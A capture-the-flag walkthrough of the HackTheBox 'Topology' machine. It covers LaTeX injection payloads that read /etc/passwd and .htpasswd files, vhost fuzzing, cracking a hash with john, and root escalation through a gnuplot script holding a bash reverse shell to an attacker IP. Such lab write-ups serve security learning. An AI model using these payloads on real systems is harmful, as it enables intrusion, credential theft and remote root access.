# HackTheBox - Topology 

## NMAP

```bash
Nmap scan report for 10.10.11.217
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT (80)

Visiting the webserver, we'll have a static page

<img src="https://i.imgur.com/nYjZ5OX.png"/>

This page lists software projects, out of which Latex Equation Generator 
takes us to `latex.topology.htb

<img src="https://i.imgur.com/5RgHI76.png"/>

<img src="https://i.imgur.com/niyLqk6.png"/>

Adding the domain name in `/etc/hosts` file

<img src="https://i.imgur.com/QPTxnsw.png"/>

<img src="https://i.imgur.com/r0Lg2Zz.png"/>

Putting `\input{/etc/passwd}` will result to an illegal command

<img src="https://i.imgur.com/xleqN1d.png"/>

<img src="https://i.imgur.com/TYGGTRX.png"/>

Most of the commands were blacklisted, we can only read the first line of files with:

```tex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file

```


<img src="https://i.imgur.com/q1jPyzz.png"/>

We can make it read more lines but the limit was 3-4 lines

```tex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\read\file to\line
\text{\line}
\read\file to\line
\text{\line}
\read\file to\line
\text{\line}
\closein\file
```

<img src="https://i.imgur.com/3gVYWjf.png"/>
Exceeding 4 lines, we'll get an error
<img src="https://i.imgur.com/opJdPJ9.png"/>

Visiting the site the site with it's root directory `/` will reveal directory listing having `tempfolder`, in that folder we'll find `texput.log`

<img src="https://i.imgur.com/T8senjo.png"/>

<img src="https://i.imgur.com/KrXeZpW.png"/>
So `\write18` is restricted, we cannot use it to execute commands neither read files, we can try fuzzing for vhosts using `wfuzz
`
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://topology.htb' -H "Host: FUZZ.topology.htb" --hh 6767
```

<img src="https://i.imgur.com/VD6jSN8.png"/>

This finds two more vhosts, `dev` and `stats`, stats site doesn't really have much

<img src="https://i.imgur.com/AXgEtzd.png"/>

Dev site asks for credentials to access the site

<img src="https://i.imgur.com/XFM2XYc.png"/>

Since the latex on the site is using `inline math mode` , we can try using `lsinputlisting` for reading local files and we need to use it with `$` at the beginning and ending of the latex command

```tex
$\lstinputlisting{/etc/passwd}$
```

<img src="https://i.imgur.com/pLdmtMu.png"/>

With this we can access the whole /etc/passwd file and see that the sites are being hosted in `/var/www`

<img src="https://i.imgur.com/U7svMyW.png"/>

We can read `/var/www/dev/.htaccess` file which shows that there's `.htpasswd` file

<img src="https://i.imgur.com/FGVAmvx.png"/>

<img src="https://i.imgur.com/kpzzPFv.png"/>

`vadaisley's` hash can be cracked with john

```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt
```

<img src="https://i.imgur.com/szYfpCz.png"/>

And now we can login through ssh

<img src="https://i.imgur.com/XMd5SsJ.png"/>

Checking `sudo -l` this user cannot run any commands as root or any user

<img src="https://i.imgur.com/rtRVy7p.png"/>

In `/opt` there's folder `gnuplot` where we have only write access

<img src="https://i.imgur.com/7xZmjDm.png"/>

From `pspy` we see gnuplot being ran as the root user and executing plt files

<img src="https://i.imgur.com/f7olWjh.png"/>

We can create a plt file with a bash reverse shell and move it in  `/opt/gnuplot`

```bash
system "bash -i >& /dev/tcp/10.10.14.111/2222 0>&1"
```

<img src="https://i.imgur.com/XooC51X.png"/>

After few seconds we'll see our plt being executed as root and  receive a connection on our listener with a root shell

<img src="https://i.imgur.com/34ASzjj.png"/>



## References

- https://0day.work/hacking-with-latex/
- https://texdoc.org/serve/latex2e.pdf/0
- https://www1.cmc.edu/pages/faculty/aaksoy/latex/latexthree.html
- https://en.wikibooks.org/wiki/LaTeX/Source_Code_Listings
- http://www.gnuplot.info/docs_4.2/node327.html
